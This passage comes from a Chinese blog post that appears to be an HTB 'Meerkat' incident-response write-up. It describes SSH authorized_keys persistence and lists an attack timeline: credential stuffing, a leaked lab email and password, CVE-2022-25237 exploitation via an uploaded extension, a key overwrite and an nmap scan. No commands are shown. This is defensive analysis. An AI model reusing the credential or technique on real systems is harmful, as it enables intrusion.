+<h2 id="SSH-Authorized-Keys"><a href="#SSH-Authorized-Keys" class="headerlink" title="SSH Authorized Keys"></a>SSH Authorized Keys</h2><p>Linux 发行版和 macOS 通常使用基于密钥的身份验证来保护远程管理的 SSH 会话的身份验证过程。SSH <code>authorized_keys</code> 中的文件指定可用于登录配置文件所针对的用户帐户的 SSH 密钥。此文件通常位于用户主目录中的 下的 <code>&lt;user-home&gt;/.ssh/authorized_keys</code>。用户可以编辑系统的 SSH 配置文件，将指令 <code>PubkeyAuthentication</code> 和 <code>RSAAuthentication</code> 修改为值 “yes”，以确保启用公钥和 <code>RSA</code> 身份验证。SSH 配置文件通常位于 下<code>/etc/ssh/sshd_config</code>。</p>
+<p>攻击者可以直接使用脚本或 shell 命令修改 SSH <code>authorized_keys</code> 文件，以添加攻击者提供的公钥。</p>
+<p>当我们需要 ssh 远程访问服务器时，会生成 ssh 公钥，然后本地机器将公钥写入到服务器的 <code>.ssh/authorized_keys</code>中，实现免密登录连接。</p>
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>大致流程</p>
+<ul>
+<li>通过凭证填充的方式来对服务器进行请求</li>
+<li>‘’<a href="mailto:&#115;&#x65;&#98;&#46;&#98;&#x72;&#x6f;&#x6f;&#x6d;&#x40;&#x66;&#x6f;&#x72;&#101;&#x6c;&#97;&#x2e;&#x63;&#x6f;&#46;&#117;&#107;">&#115;&#x65;&#98;&#46;&#98;&#x72;&#x6f;&#x6f;&#x6d;&#x40;&#x66;&#x6f;&#x72;&#101;&#x6c;&#97;&#x2e;&#x63;&#x6f;&#46;&#117;&#107;</a>:g0vernm3nt”成功登录</li>
+<li>利用 CVE-2022-25237 来上传 <code>rce_api_extension.zip</code> 文件，然后再删除</li>
+<li>通过脚本将新的 ssh 公钥覆盖写入 <code>/home/ubuntu/.ssh/authorized_keys</code> 中</li>
+<li>ssh 连接下载了一些软件包</li>
+<li>nmap 对 IP:34.207.150.13 进行端口枚举</li>
+<li>结束 ssh 会话</li>
+</ul>
+<p><img src="https://img.dkdun.cn/v1/2025/12/e48656578bbfe459.png"></p>
+<p>从 6385 开始就在对端口进行扫描，应该是打开了 nmap</p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/3da479c6bf97b741.png"></p>
+<p>直到最后结束 ssh 会话</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="category-chain-item">应急响应</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/HTB/" class="category-chain-item">HTB</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="print-no-link">#应急响应</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB-Meerkat</div>
+      <div>http://example.com/2025/03/25/HTB-Meerkat/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>butt3rf1y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月25日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/24/HTB-Brutus/" title="HTB-Brutus">
+                        <span class="hidden-mobile">HTB-Brutus</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments">
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"rWKtzRd76Kz6dC7Vd9dUwQux-gzGzoHsz","appKey":"DxMgc7gveh6B1aJKyAZnoFNj","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":true,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span> </a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+
+
+  <!--下面两行是核心内容-->
+  <link  rel="stylesheet" href="/css/TrymenT-ClocK.min.css" />
+  <script  src="/js/TrymenT-ClocK.min.js" ></script>
+ 
